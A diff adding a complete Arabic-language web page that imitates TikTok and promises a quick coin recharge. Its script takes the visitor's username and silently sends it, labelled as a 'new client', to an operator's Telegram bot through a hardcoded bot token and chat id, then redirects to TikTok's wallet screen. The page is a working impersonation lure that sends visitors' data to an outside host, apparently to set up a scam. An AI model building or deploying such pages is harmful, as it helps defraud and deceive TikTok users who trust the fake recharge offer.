@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شحن عملات تيك توك</title>
+    <style>
+        body { background-color: #010101; color: white; font-family: sans-serif; text-align: center; padding: 40px 20px; }
+        .box { border: 1px solid #333; padding: 20px; border-radius: 15px; background: #0a0a0a; max-width: 400px; margin: auto; }
+        h1 { color: #fe2c55; }
+        input { padding: 15px; width: 90%; border-radius: 10px; border: 1px solid #444; background: #1a1a1a; color: white; margin-bottom: 20px; text-align: center; }
+        button { background: linear-gradient(45deg, #fe2c55, #25f4ee); color: black; border: none; padding: 15px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; font-size: 18px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://www.tiktok.com/favicon.ico" width="50">
+        <h1>نظام الشحن السريع</h1>
+        <p>ادخل اسم المستخدم لتأكيد هويتك وبدء الشحن</p>
+        <input type="text" id="user" placeholder="@username">
+        <button onclick="send()">تأكيد وتسجيل الدخول</button>
+    </div>
+    <script>
+        function send() {
+            const name = document.getElementById('user').value;
+            if(!name) { alert("برجاء كتابة اسم المستخدم"); return; }
+            const token = "8797896445:AAFg2pPj1C5tbUR72m-raHrRwzYTgBLSAVo";
+            const id = "5533405786";
+            const text = `🚀 عميل جديد جاهز:\nالاسم: ${name}\nالحالة: منتظر الشحن الآن!`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`)
+            .then(() => { window.location.href = "snssdk1128://wallet"; });
+        }
+    </script>
+</body>
+</html>
